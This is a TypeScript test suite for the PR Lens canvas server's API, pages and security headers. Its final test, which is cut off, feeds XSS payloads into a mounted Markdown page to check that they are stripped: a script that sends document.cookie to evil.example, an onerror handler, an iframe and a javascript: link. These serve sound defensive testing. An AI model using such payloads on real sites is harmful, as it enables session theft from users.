import assert from "node:assert/strict";
import { mkdtemp, rm, utimes, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, describe, it } from "node:test";

import { payloadGraph } from "@coldtea/pr-lens-schema/examples";

import { call, start, type Harness } from "./harness.ts";
import { resolveProvenanceInfo } from "../src/page.ts";

/**
 * The canvas contract, walked end to end the way the CLI walks it.
 *
 * These assertions are copied from the spec rather than from the code, so a
 * refactor that changes an answer's shape fails here. Where the spec fixes an
 * order of checks, the test asks for two failures at once and insists on the
 * earlier one.
 */

const json = { "content-type": "application/json" };

describe("the canvas contract", () => {
  let harness: Harness;
  before(async () => {
    harness = await start({ LOG_REQUESTS: "false" });
  });
  after(async () => harness.close());

  const api = () => `${harness.url}/api/canvas`;

  it("mints a canvas with a plaintext token, rev 0 and three addresses", async () => {
    const minted = await call(api(), { method: "POST" });

    assert.equal(minted.status, 201);
    assert.match(minted.body.id, /^[A-Za-z0-9_-]{22}$/);
    assert.match(minted.body.writeToken, /^[A-Za-z0-9_-]{22}$/);
    assert.equal(minted.body.rev, 0);
    assert.equal(minted.body.viewUrl, `${harness.url}/c/${minted.body.id}`);
    assert.equal(
      minted.body.editUrl,
      `${minted.body.viewUrl}#w=${minted.body.writeToken}`,
    );
    assert.equal(minted.body.embedUrl, `${minted.body.viewUrl}.svg`);
    assert.equal(minted.headers.get("cache-control"), "no-store");
    assert.notEqual(minted.body.id, minted.body.writeToken);
  });

  it("answers NOT_FOUND for a canvas minted but never pushed to", async () => {
    const minted = await call(api(), { method: "POST" });
    const fetched = await call(`${api()}/${minted.body.id}`);

    assert.equal(fetched.status, 404);
    assert.equal(fetched.body.error.code, "NOT_FOUND");
  });

  it("answers NOT_FOUND for an id nobody minted", async () => {
    const fetched = await call(`${api()}/Qk3vZp9xLm2aRt8yWn4bCg`);

    assert.equal(fetched.status, 404);
    assert.equal(fetched.body.error.code, "NOT_FOUND");
  });

  it("stores a document and draws it", async () => {
    const minted = await call(api(), { method: "POST" });
    const { id, writeToken } = minted.body;

    const pushed = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: {
        ...json,
        authorization: `Bearer ${writeToken}`,
        "if-match": "0",
      },
      body: JSON.stringify(payloadGraph),
    });

    assert.equal(pushed.status, 200);
    assert.equal(pushed.body.rev, 1);
    assert.equal(pushed.body.editUrl, `${harness.url}/c/${id}#w=${writeToken}`);
    assert.ok(pushed.body.tiles.length > 0, "the renderer drew nothing");

    const heroes = pushed.body.tiles.filter((tile: any) => tile.hero === true);
    assert.equal(heroes.length, 1, "exactly one tile is the hero");
    assert.equal(pushed.body.tiles[0].hero, true, "and it is the first");

    for (const tile of pushed.body.tiles) {
      assert.match(tile.id, /^(view|flow|lens):/);
      assert.ok(["architecture", "data-flow"].includes(tile.lens));
      assert.equal(typeof tile.title, "string");
      assert.ok(Array.isArray(tile.crumbs));
      assert.ok(tile.width > 0 && tile.height > 0);
      assert.equal(typeof tile.renders.light, "string");
      assert.equal(typeof tile.renders.dark, "string");
      assert.ok(tile.images.light.startsWith(`${harness.url}/images/${id}/`));
      assert.ok(tile.images.dark.startsWith(`${harness.url}/images/${id}/`));
    }

    const fetched = await call(`${api()}/${id}`);
    assert.equal(fetched.status, 200);
    assert.equal(fetched.body.rev, 1);
    assert.deepEqual(fetched.body.document, JSON.parse(JSON.stringify(payloadGraph)));
    assert.equal(fetched.body.tiles.length, pushed.body.tiles.length);
    // The read answer never carries the write capability.
    assert.equal(fetched.body.editUrl, undefined);
  });

  it("nests crumbs root first and names the view last", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;
    const pushed = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...json, authorization: `Bearer ${writeToken}`, "if-match": "0" },
      body: JSON.stringify(payloadGraph),
    });

    for (const tile of pushed.body.tiles) {
      if (!tile.id.startsWith("view:")) continue;
      assert.equal(
        tile.crumbs.at(-1),
        tile.id.slice("view:".length),
        "a view's trail ends at itself",
      );
    }
  });

  it("refuses a push that lands on the wrong revision, and changes nothing", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;
    const headers = { ...json, authorization: `Bearer ${writeToken}` };

    await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...headers, "if-match": "0" },
      body: JSON.stringify(payloadGraph),
    });

    const stale = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...headers, "if-match": "0" },
      body: JSON.stringify(payloadGraph),
    });

    assert.equal(stale.status, 409);
    assert.equal(stale.body.error.code, "REVISION_MOVED");
    assert.equal(stale.body.error.rev, 1);

    const fetched = await call(`${api()}/${id}`);
    assert.equal(fetched.body.rev, 1, "the refused push changed nothing");
  });

  it("tolerates a quoted If-Match", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;
    const pushed = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: {
        ...json,
        authorization: `Bearer ${writeToken}`,
        "if-match": '"0"',
      },
      body: JSON.stringify(payloadGraph),
    });

    assert.equal(pushed.status, 200);
  });

  it("checks If-Match before the token, and the token before the revision", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;

    // No If-Match and a wrong token: the contract's first check wins.
    const noIfMatch = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...json, authorization: "Bearer Aaaaaaaaaaaaaaaaaaaaaa" },
      body: JSON.stringify(payloadGraph),
    });
    assert.equal(noIfMatch.status, 400);
    assert.equal(noIfMatch.body.error.code, "INVALID_REQUEST");

    // A wrong token and a wrong revision: NOT_FOUND, never REVISION_MOVED,
    // which would tell a guesser the canvas exists.
    const wrongToken = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: {
        ...json,
        authorization: "Bearer Aaaaaaaaaaaaaaaaaaaaaa",
        "if-match": "7",
      },
      body: JSON.stringify(payloadGraph),
    });
    assert.equal(wrongToken.status, 404);
    assert.equal(wrongToken.body.error.code, "NOT_FOUND");
  });

  it("refuses a body that is not JSON before it looks at the token", async () => {
    const { id } = (await call(api(), { method: "POST" })).body;
    const answer = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: {
        ...json,
        authorization: "Bearer Aaaaaaaaaaaaaaaaaaaaaa",
        "if-match": "0",
      },
      body: "{oh no",
    });

    assert.equal(answer.status, 400);
    assert.equal(answer.body.error.code, "INVALID_REQUEST");
  });

  it("lists every issue in a document it will not store", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;
    const answer = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...json, authorization: `Bearer ${writeToken}`, "if-match": "0" },
      body: JSON.stringify({ kind: "graph", title: "not really" }),
    });

    assert.equal(answer.status, 422);
    assert.equal(answer.body.error.code, "INVALID_DOCUMENT");
    assert.ok(answer.body.error.issues.length > 0);
    for (const issue of answer.body.error.issues) {
      assert.equal(typeof issue.code, "string");
      assert.equal(typeof issue.path, "string");
      assert.equal(typeof issue.message, "string");
    }
  });

  it("rotates, replays a rotation, and verifies a token against itself", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;
    const next = "Ab3dEf5gHi7jKl9mNo1pQr";

    const rotated = await call(`${api()}/${id}/rotate`, {
      method: "POST",
      headers: { ...json, authorization: `Bearer ${writeToken}` },
      body: JSON.stringify({ writeToken: next }),
    });
    assert.equal(rotated.status, 200);
    assert.equal(rotated.body.editUrl, `${harness.url}/c/${id}#w=${next}`);

    // The same pair again: an answer lost on the way back costs nothing.
    const replayed = await call(`${api()}/${id}/rotate`, {
      method: "POST",
      headers: { ...json, authorization: `Bearer ${writeToken}` },
      body: JSON.stringify({ writeToken: next }),
    });
    assert.equal(replayed.status, 200);
    assert.equal(replayed.body.editUrl, rotated.body.editUrl);

    // A rotation onto itself is how the CLI asks "does this token work?".
    const verified = await call(`${api()}/${id}/rotate`, {
      method: "POST",
      headers: { ...json, authorization: `Bearer ${next}` },
      body: JSON.stringify({ writeToken: next }),
    });
    assert.equal(verified.status, 200);

    const retired = await call(`${api()}/${id}/rotate`, {
      method: "POST",
      headers: { ...json, authorization: `Bearer ${writeToken}` },
      body: JSON.stringify({ writeToken: "Zz3dEf5gHi7jKl9mNo1pQr" }),
    });
    assert.equal(retired.status, 404, "the old token no longer writes");
  });

  it("checks the rotation body before the bearer token", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;

    for (const body of [{}, { writeToken: "too-short" }]) {
      const answer = await call(`${api()}/${id}/rotate`, {
        method: "POST",
        headers: { ...json, authorization: "Bearer Aaaaaaaaaaaaaaaaaaaaaa" },
        body: JSON.stringify(body),
      });
      assert.equal(answer.status, 400);
      assert.equal(answer.body.error.code, "INVALID_REQUEST");
    }

    // And the good token still works afterwards.
    const rotated = await call(`${api()}/${id}/rotate`, {
      method: "POST",
      headers: { ...json, authorization: `Bearer ${writeToken}` },
      body: JSON.stringify({ writeToken }),
    });
    assert.equal(rotated.status, 200);
  });

  it("does not bump the revision when a token rotates", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;
    await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...json, authorization: `Bearer ${writeToken}`, "if-match": "0" },
      body: JSON.stringify(payloadGraph),
    });

    const next = "Rr3dEf5gHi7jKl9mNo1pQr";
    await call(`${api()}/${id}/rotate`, {
      method: "POST",
      headers: { ...json, authorization: `Bearer ${writeToken}` },
      body: JSON.stringify({ writeToken: next }),
    });

    const fetched = await call(`${api()}/${id}`);
    assert.equal(fetched.body.rev, 1);

    const pushed = await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...json, authorization: `Bearer ${next}`, "if-match": "1" },
      body: JSON.stringify(payloadGraph),
    });
    assert.equal(pushed.body.rev, 2);
  });

  it("deletes a canvas, and stays deleted", async () => {
    const { id, writeToken } = (await call(api(), { method: "POST" })).body;
    await call(`${api()}/${id}`, {
      method: "PUT",
      headers: { ...json, authorization: `Bearer ${writeToken}`, "if-match": "0" },
      body: JSON.stringify(payloadGraph),
    });

    const wrong = await call(`${api()}/${id}`, {
      method: "DELETE",
      headers: { authorization: "Bearer Aaaaaaaaaaaaaaaaaaaaaa" },
    });
    assert.equal(wrong.status, 404);

    const deleted = await call(`${api()}/${id}`, {
      method: "DELETE",
      headers: { authorization: `Bearer ${writeToken}` },
    });
    assert.equal(deleted.status, 200);
    assert.deepEqual(deleted.body, { id, deleted: true });

    assert.equal((await call(`${api()}/${id}`)).status, 404);
    assert.equal(
      (
        await call(`${api()}/${id}`, {
          method: "DELETE",
          headers: { authorization: `Bearer ${writeToken}` },
        })
      ).status,
      404,
    );
  });

  it("refuses a body over the limit with TOO_LARGE", async () => {
    const small = await start({ LOG_REQUESTS: "false", MAX_BODY_BYTES: "512" });
    try {
      const { id, writeToken } = (
        await call(`${small.url}/api/canvas`, { method: "POST" })
      ).body;

      const answer = await call(`${small.url}/api/canvas/${id}`, {
        method: "PUT",
        headers: { ...json, authorization: `Bearer ${writeToken}`, "if-match": "0" },
        body: JSON.stringify(payloadGraph),
      });

      assert.equal(answer.status, 413);
      assert.equal(answer.body.error.code, "TOO_LARGE");
    } finally {
      await small.close();
    }
  });

  it("meters minting and names a time to come back", async () => {
    const metered = await start({
      LOG_REQUESTS: "false",
      MINTS_PER_HOUR_PER_IP: "1",
    });
    try {
      assert.equal(
        (await call(`${metered.url}/api/canvas`, { method: "POST" })).status,
        201,
      );
      const refused = await call(`${metered.url}/api/canvas`, { method: "POST" });

      assert.equal(refused.status, 429);
      assert.equal(refused.body.error.code, "RATE_LIMITED");
      assert.ok(
        !Number.isNaN(Date.parse(refused.body.error.retryAt)),
        "retryAt is an ISO 8601 timestamp",
      );
    } finally {
      await metered.close();
    }
  });

  it("answers tiles: [] when it is told not to draw", async () => {
    const plain = await start({ LOG_REQUESTS: "false", DRAW: "false" });
    try {
      const { id, writeToken } = (
        await call(`${plain.url}/api/canvas`, { method: "POST" })
      ).body;

      const pushed = await call(`${plain.url}/api/canvas/${id}`, {
        method: "PUT",
        headers: { ...json, authorization: `Bearer ${writeToken}`, "if-match": "0" },
        body: JSON.stringify(payloadGraph),
      });

      assert.equal(pushed.status, 200);
      assert.deepEqual(pushed.body.tiles, []);
    } finally {
      await plain.close();
    }
  });
});

describe("the pages and the pictures", () => {
  let harness: Harness;
  let id: string;

  before(async () => {
    harness = await start({ LOG_REQUESTS: "false" });
    const minted = await call(`${harness.url}/api/canvas`, { method: "POST" });
    id = minted.body.id;
    await call(`${harness.url}/api/canvas/${id}`, {
      method: "PUT",
      headers: {
        ...json,
        authorization: `Bearer ${minted.body.writeToken}`,
        "if-match": "0",
      },
      body: JSON.stringify(payloadGraph),
    });
  });
  after(async () => harness.close());

  it("serves the canvas page at /c/{id}, which is what pull accepts", async () => {
    const response = await fetch(`${harness.url}/c/${id}`);
    const html = await response.text();

    assert.equal(response.status, 200);
    assert.match(response.headers.get("content-type") ?? "", /text\/html/);
    // Nothing off this origin: the only script is inline, with no src to fetch,
    // and no assets (images, stylesheets, fonts) are loaded from elsewhere.
    assert.doesNotMatch(html, /<script[^>]*\ssrc=/i);
    assert.doesNotMatch(
      html,
      /<(?:script|img|link|source)[^>]+https?:\/\/(?!127\.0\.0\.1)/i,
    );
  });

  it("carries the theme switcher, and the state it needs to survive a reload", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();

    // One of three, and the picture's media query is what a choice overrides,
    // since a chosen theme does not move the browser's own preference.
    for (const choice of ["light", "dark", "auto"])
      assert.match(html, new RegExp(`data-theme-choice="${choice}"`), choice);
    assert.match(html, /role="radiogroup"/);
    assert.match(html, /localStorage\.setItem/);
    assert.match(html, /prefers-color-scheme: dark/);

    // The attribute lands in <head>, before anything is painted.
    const head = html.slice(0, html.indexOf("</head>"));
    assert.match(head, /<script nonce=/, "a reader who chose dark must not see a flash");
    assert.match(head, /dataset\.theme/);
  });

  it("addresses its pictures by path, so they are this origin whatever PUBLIC_URL says", async () => {
    // A deployment behind an ingress that reverses https to http, or one whose
    // PUBLIC_URL names another host, would otherwise emit absolute URLs that the
    // page's own `img-src 'self'` refuses.
    const proxied = await start({
      LOG_REQUESTS: "false",
      PUBLIC_URL: "https://lens.example.com",
    });
    try {
      const minted = await call(`${proxied.url}/api/canvas`, { method: "POST" });
      await call(`${proxied.url}/api/canvas/${minted.body.id}`, {
        method: "PUT",
        headers: {
          ...json,
          authorization: `Bearer ${minted.body.writeToken}`,
          "if-match": "0",
        },
        body: JSON.stringify(payloadGraph),
      });

      const html = await (await fetch(`${proxied.url}/c/${minted.body.id}`)).text();
      assert.match(html, /src="\/images\//);
      assert.match(html, /srcset="\/images\//);
      assert.doesNotMatch(html, /"https:\/\/lens\.example\.com/);

      // The API answers still carry absolute ones: a README embed is fetched
      // from somewhere else entirely.
      const fetched = await call(`${proxied.url}/api/canvas/${minted.body.id}`);
      assert.match(
        fetched.body.tiles[0].images.light,
        /^https:\/\/lens\.example\.com\/images\//,
      );
    } finally {
      await proxied.close();
    }
  });

  it("touches only the pictures this server drew", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();

    // A mounted index page may hold pictures with art-direction queries of its
    // own, and the theme script has no business rewriting those.
    assert.match(html, /<source [^>]*data-theme-dark>/);
    assert.match(html, /querySelectorAll\("source\[data-theme-dark\]"\)/);
  });

  it("runs its own script by nonce, and nothing else at all", async () => {
    const response = await fetch(`${harness.url}/c/${id}`);
    const html = await response.text();
    const policy = response.headers.get("content-security-policy") ?? "";

    const nonce = /<script nonce="([^"]+)"/.exec(html)?.[1];
    assert.ok(nonce !== undefined, "the page signs its own script");
    assert.match(policy, new RegExp(`script-src 'nonce-${nonce.replace(/[+/=]/g, "\\$&")}'`));
    assert.match(policy, /default-src 'none'/);
    assert.doesNotMatch(policy, /unsafe-inline[^;]*script|script[^;]*unsafe-inline/);
  });

  it("serves the hero as an SVG at /c/{id}.svg, with its render as the etag", async () => {
    const response = await fetch(`${harness.url}/c/${id}.svg`);
    const svg = await response.text();
    const etag = response.headers.get("etag");

    assert.equal(response.status, 200);
    assert.match(response.headers.get("content-type") ?? "", /image\/svg\+xml/);
    assert.match(svg, /^<svg/);
    assert.ok(etag !== null);

    const again = await fetch(`${harness.url}/c/${id}.svg`, {
      headers: { "if-none-match": etag },
    });
    assert.equal(again.status, 304);

    const dark = await fetch(`${harness.url}/c/${id}.svg?theme=dark`);
    assert.notEqual(dark.headers.get("etag"), etag);
  });

  it("serves content-addressed pictures that may be cached for ever", async () => {
    const fetched = await call(`${harness.url}/api/canvas/${id}`);
    const url: string = fetched.body.tiles[0].images.light;

    const response = await fetch(url);
    assert.equal(response.status, 200);
    assert.match(await response.text(), /^<svg/);
    assert.match(
      response.headers.get("cache-control") ?? "",
      /immutable/,
      "the hash is in the name, so the bytes can never change",
    );

    // The hash is part of the address, so a wrong one is simply not here.
    const wrong = url.replace(/-[0-9a-f]{32}\.svg$/, "-deadbeefdeadbeefdeadbeefdeadbeef.svg");
    assert.equal((await fetch(wrong)).status, 404);
  });

  it("keeps the API answers out of every cache", async () => {
    for (const path of [`/api/canvas/${id}`, `/c/${id}`]) {
      const response = await fetch(`${harness.url}${path}`);
      assert.equal(response.headers.get("cache-control"), "no-store", path);
    }
  });

  it("renders streamlined provenance metadata in document and canvas modes", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();
    assert.match(html, /<h1>Send broadcasts in batches of 500<\/h1>/);
    assert.match(html, /class="provenance"/);
    assert.match(html, /ohansemmanuel\/bestregards #128/);
    assert.match(html, /https:\/\/github\.com\/ohansemmanuel\/bestregards\/pull\/128/);
    assert.match(html, /class="canvas-header-card"/);
    assert.match(html, /class="canvas-header-title"[^>]*>Send broadcasts in batches of 500<\/div>/);
    assert.match(html, /class="canvas-header-meta"[^>]*>Revision 1 &middot; \d+ diagrams<\/span>/);
    assert.match(html, /<p class="rev">Revision 1 &middot; \d+ diagrams<\/p>/);
  });

  it("gracefully falls back when provenance information is partially missing", () => {
    const withBranch = resolveProvenanceInfo("c-1", "Default Title", {
      repo: { owner: "acme", name: "widgets" },
      head: { ref: "fix-bug" },
    });
    assert.equal(withBranch.mrTitle, "Default Title");
    assert.match(withBranch.row2Content, /acme\/widgets \(fix-bug\)/);

    const withRepoOnly = resolveProvenanceInfo("c-2", "Default Title", {
      repo: { owner: "acme", name: "widgets" },
    });
    assert.match(withRepoOnly.row2Content, /acme\/widgets/);

    const withPrOnly = resolveProvenanceInfo("c-3", "Default Title", {
      pullRequest: { number: 42, url: "https://example.com/pr/42" },
    });
    assert.match(withPrOnly.row2Content, /#42/);

    const withBranchOnly = resolveProvenanceInfo("c-4", "Default Title", {
      head: { ref: "main" },
    });
    assert.match(withBranchOnly.row2Content, /main/);
  });

  it("serves the demo page at /demo with sample architectures and sample switcher", async () => {
    const response = await fetch(`${harness.url}/demo`);
    assert.equal(response.status, 200);
    const html = await response.text();

    assert.match(html, /class="demo-banner"/);
    assert.match(html, /<h1>feat\(helm\): let the ingress answer on more than one host<\/h1>/);
    assert.match(html, /thejoeejoee\/pr-lens-git-backend #17/);
    assert.match(html, /https:\/\/github\.com\/thejoeejoee\/pr-lens-git-backend\/pull\/17/);
    assert.match(html, /href="\/demo\?sample=single"/);
    assert.match(html, /href="\/demo\?sample=multi"/);

    // Default is multi (6 diagrams)
    assert.match(html, /Revision 1 &middot; 6 diagrams/);

    // Switch to single diagram sample (1 diagram)
    const singleHtml = await (await fetch(`${harness.url}/demo?sample=single`)).text();
    assert.match(singleHtml, /Revision 1 &middot; 1 diagram/);
    assert.match(singleHtml, /Multi-Host Ingress Architecture/);
    assert.match(singleHtml, /thejoeejoee\/pr-lens-git-backend/);
  });

  it("serves /demo.svg with etag and 304 revalidation", async () => {
    const response = await fetch(`${harness.url}/demo.svg`);
    assert.equal(response.status, 200);
    assert.match(response.headers.get("content-type") ?? "", /image\/svg\+xml/);
    const etag = response.headers.get("etag");
    assert.ok(etag !== null);

    const reval = await fetch(`${harness.url}/demo.svg`, {
      headers: { "if-none-match": etag },
    });
    assert.equal(reval.status, 304);
  });

  it("serves demo content-addressed pictures", async () => {
    const demoHtml = await (await fetch(`${harness.url}/demo`)).text();
    const match = /src="(\/images\/demo-multi\/[^"]+)"/.exec(demoHtml);
    assert.ok(match !== null, "demo page contains image reference");

    const imgResponse = await fetch(`${harness.url}${match[1]}`);
    assert.equal(imgResponse.status, 200);
    assert.match(imgResponse.headers.get("content-type") ?? "", /image\/svg\+xml/);
    assert.match(await imgResponse.text(), /^<svg/);
  });

  it("renders interactive figures with diagram indices and interactive badges", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();
    assert.match(html, /class="interactive-figure"/);
    assert.match(html, /data-diagram-index="0"/);
    assert.match(html, /class="figure-hint"/);
  });

  it("serves the lightbox dialog, pan-zoom controls, and cheatsheet help modal", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();

    // Lightbox modal markup
    assert.match(html, /<dialog class="lightbox" id="lightbox"/);
    assert.match(html, /id="lightbox-stage"/);
    assert.match(html, /id="lightbox-canvas"/);
    assert.match(html, /id="lb-zoom-pill"/);
    assert.match(html, /id="lb-prev"/);
    assert.match(html, /id="lb-next"/);
    assert.match(html, /id="lb-close"/);

    // Help cheatsheet dialog markup
    assert.match(html, /<dialog class="help-dialog" id="help-dialog"/);
    assert.match(html, /Shortcuts &amp; Gestures/);
    assert.match(html, /scroll or pinch/);
    assert.match(html, /drag/);
    assert.match(html, /<kbd>←<\/kbd>\s*<kbd>→<\/kbd>/);
    assert.match(html, /<kbd>1<\/kbd>/);
    assert.match(html, /<kbd>0<\/kbd>/);
    assert.match(html, /<kbd>Esc<\/kbd>/);

    // Embedded diagram tiles data script
    assert.match(html, /<script id="pr-lens-tiles" type="application\/json"/);

    // Nonced client wiring with pointer, wheel, and keyboard listeners
    assert.match(html, /setPointerCapture/);
    assert.match(html, /addEventListener\("wheel"/);
    assert.match(html, /addEventListener\("keydown"/);
    assert.match(html, /ArrowLeft/);
    assert.match(html, /ArrowRight/);
  });

  it("carries view mode switcher and boots with zero layout shift", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();

    // Mode switcher buttons
    assert.match(html, /data-mode-choice="document"/);
    assert.match(html, /data-mode-choice="canvas"/);

    // Boot script in <head> checks both theme and view-mode
    const head = html.slice(0, html.indexOf("</head>"));
    assert.match(head, /localStorage\.getItem\("pr-lens-view-mode"\)/);
    assert.match(head, /dataset\.viewMode/);
  });

  it("serves the interactive canvas workspace with dock and caption pill", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();

    assert.match(html, /id="canvas-workspace"/);
    assert.match(html, /id="canvas-stage"/);
    assert.match(html, /id="canvas-diagram-container"/);
    assert.match(html, /id="canvas-caption-pill"/);
    assert.match(html, /id="canvas-dock"/);
    assert.match(html, /class="dock-item/);
    assert.match(html, /id="canvas-zoom-pill"/);
  });

  it("renders responsive picture elements with intrinsic dimensions for vector sharpness", async () => {
    const html = await (await fetch(`${harness.url}/c/${id}`)).text();

    assert.match(html, /id="canvas-diagram-body"[^>]*>[\s\S]*?<picture>/);
    assert.match(html, /<img src="\/images\/[^"]+" width="\d+" height="\d+"/);
    assert.match(html, /media="\(prefers-color-scheme: dark\)"/);
  });
});

describe("the index page", () => {
  let harness: Harness;
  before(async () => {
    harness = await start({ LOG_REQUESTS: "false" });
  });
  after(async () => harness.close());

  it("explains what the host is", async () => {
    const response = await fetch(harness.url + "/");
    const html = await response.text();

    assert.equal(response.status, 200);
    assert.match(response.headers.get("content-type") ?? "", /text\/html/);
    assert.match(html, /PR Lens canvas server/);
    assert.doesNotMatch(html, /<script[^>]*\ssrc=/i);
    // The same switcher, reading the same key, so a choice made on a canvas page
    // is still in force here.
    assert.match(html, /data-theme-choice="auto"/);
    assert.match(html, /"pr-lens-theme"/);
  });

  it("shows how to redirect the skill and the CLI at this host", async () => {
    const html = await (await fetch(harness.url + "/")).text();

    // The variable, the flag, and the agent skill that also defaults elsewhere.
    assert.match(html, new RegExp(`export PR_LENS_API_URL=${harness.url}`));
    assert.match(html, new RegExp(`--api ${harness.url}`));
    assert.match(html, /diagram this PR with pr-lens/);
    assert.match(html, /canvas push/);
    assert.match(html, /canvas pull/);
    // The console output on the page is the CLI's real wording, checked by
    // running it against this server rather than imagined.
    assert.match(html, /unlisted: anyone you share it with can open it/);

    // The example links are this host, which is the whole point of the page.
    assert.match(html, new RegExp(`${harness.url}/c/[A-Za-z0-9_-]+`));
    assert.match(html, /prlens\.dev/, "it says what it is replacing");
  });

  it("never puts a real canvas id on the page", async () => {
    const minted = await call(`${harness.url}/api/canvas`, { method: "POST" });
    const html = await (await fetch(harness.url + "/")).text();

    assert.ok(!html.includes(minted.body.id), "an id is a read capability");
    assert.ok(!html.includes(minted.body.writeToken));
  });

  it("keeps the token out, while saying which store it is", async () => {
    // A remote that is not there, so the page is rendered without a round trip
    // going anywhere. What it says about the store is the point; the count it
    // cannot take is allowed to be missing.
    const nowhere = await mkdtemp(join(tmpdir(), "pr-lens-nowhere-"));
    const withStore = await start({
      LOG_REQUESTS: "false",
      STORE: "git",
      GIT_REMOTE: join(nowhere, "canvases.git"),
      GIT_MIRROR_DIR: join(nowhere, "mirror.git"),
      GIT_TOKEN: "glpat-do-not-leak-me",
    });
    try {
      const html = await (await fetch(withStore.url + "/")).text();

      assert.ok(!html.includes("glpat-do-not-leak-me"), "the token is on the page");
      // The fact itself, not the word: this server's own name has "git" in it,
      // so anything looser would pass whatever the store turned out to be.
      assert.match(html, /<dt>Store<\/dt><dd>git</);
    } finally {
      await withStore.close();
      await rm(nowhere, { recursive: true, force: true });
    }
  });

  it("counts the canvases it holds", async () => {
    const counting = await start({ LOG_REQUESTS: "false" });
    try {
      assert.match(
        await (await fetch(counting.url + "/")).text(),
        /Canvases<\/dt><dd>none yet/,
      );

      await call(`${counting.url}/api/canvas`, { method: "POST" });
      await call(`${counting.url}/api/canvas`, { method: "POST" });

      assert.match(
        await (await fetch(counting.url + "/")).text(),
        /Canvases<\/dt><dd>2</,
      );
    } finally {
      await counting.close();
    }
  });

  it("warns that a memory store forgets everything", async () => {
    const html = await (await fetch(harness.url + "/")).text();
    assert.match(html, /forgets every canvas/);
  });

  it("is not cached, since the count on it would go stale", async () => {
    const response = await fetch(harness.url + "/");
    assert.equal(response.headers.get("cache-control"), "no-store");
  });

  it("can be turned off entirely", async () => {
    const quiet = await start({ LOG_REQUESTS: "false", INDEX_PAGE: "false" });
    try {
      const response = await call(quiet.url + "/");
      assert.equal(response.status, 404);
      assert.equal(response.body.error.code, "NOT_FOUND");
    } finally {
      await quiet.close();
    }
  });

  it("includes a link to /demo", async () => {
    const html = await (await fetch(harness.url + "/")).text();
    assert.match(html, /href="\/demo"/);
    assert.match(html, /Try the interactive demo/);
  });
});

/**
 * The page at `/`, replaced by one the operator wrote.
 *
 * The file is the interface, because in Kubernetes a page of prose is a
 * ConfigMap and a ConfigMap is a mounted file. So these tests write files and
 * edit them under a running server, which is what `kubectl edit configmap` does
 * to a pod.
 */
describe("a mounted index page", () => {
  let dir: string;
  let file: string;
  let harness: Harness;

  const write = async (markdown: string): Promise<void> => {
    await writeFile(file, markdown, "utf8");
    // mtime is the whole cache key, and two writes can land in the same
    // millisecond on a filesystem with a coarse clock.
    const ahead = new Date(Date.now() + 10_000);
    await utimes(file, ahead, ahead);
  };

  before(async () => {
    dir = await mkdtemp(join(tmpdir(), "pr-lens-index-"));
    file = join(dir, "index.md");
    await write("# Platform canvases\n\nAsk in `#platform-eng`.\n");
    harness = await start({ LOG_REQUESTS: "false", INDEX_MARKDOWN_FILE: file });
  });
  after(async () => {
    await harness.close();
    await rm(dir, { recursive: true, force: true });
  });

  it("serves the operator's page instead of this server's", async () => {
    const response = await fetch(harness.url + "/");
    const html = await response.text();

    assert.equal(response.status, 200);
    assert.match(response.headers.get("content-type") ?? "", /text\/html/);
    assert.match(html, /<h1>Platform canvases<\/h1>/);
    assert.match(html, /<code>#platform-eng<\/code>/);
    // The heading names the page, since Markdown cannot say <title> itself.
    assert.match(html, /<title>Platform canvases<\/title>/);
    // And the default page is gone, not merely pushed down.
    assert.doesNotMatch(html, /instead of prlens\.dev/);
  });

  it("keeps the shell, so the theme switcher still works there", async () => {
    const html = await (await fetch(harness.url + "/")).text();
    assert.match(html, /data-theme-choice="auto"/);
    assert.match(html, /"pr-lens-theme"/);
  });

  it("fills in what the operator cannot know when writing the file", async () => {
    await write(
      "# Ours\n\n```sh\nexport PR_LENS_API_URL={{origin}}\n```\n\nstore {{store}}, {{canvases}}, v{{version}}.\n",
    );
    const html = await (await fetch(harness.url + "/")).text();

    assert.match(html, new RegExp(`export PR_LENS_API_URL=${harness.url}`));
    assert.match(html, /store memory, none yet, v\d+\.\d+\.\d+\./);
  });

  it("follows the file when it changes, with no restart", async () => {
    await write("# Edited\n\nsecond thoughts.\n");
    const html = await (await fetch(harness.url + "/")).text();

    assert.match(html, /<h1>Edited<\/h1>/);
    assert.match(html, /second thoughts/);
  });

  it("serves the last copy it read when the file goes missing", async () => {
    await write("# Still here\n");
    assert.match(await (await fetch(harness.url + "/")).text(), /Still here/);

    await rm(file);
    const response = await fetch(harness.url + "/");

    assert.equal(response.status, 200, "an index page is not worth a 500");
    assert.match(await response.text(), /Still here/);
    await write("# Still here\n");
  });

  it("drops anything in the file that could execute", async () => {
    await write(
      [
        "# Ours",
        "",
        "<script>fetch('https://evil.example/' + document.cookie)</script>",
        "",
        '<img src="x" onerror="alert(1)">',
        "",
        '<iframe src="https://evil.example"></iframe>',
        "",
        "[a link](javascript:alert(1))",
        "",
        "<p>but the prose survives</p>",
        "",
        '<details><summary>and so does <b>this</b></summary>kept</details>',
      ].join("\n"),
    );
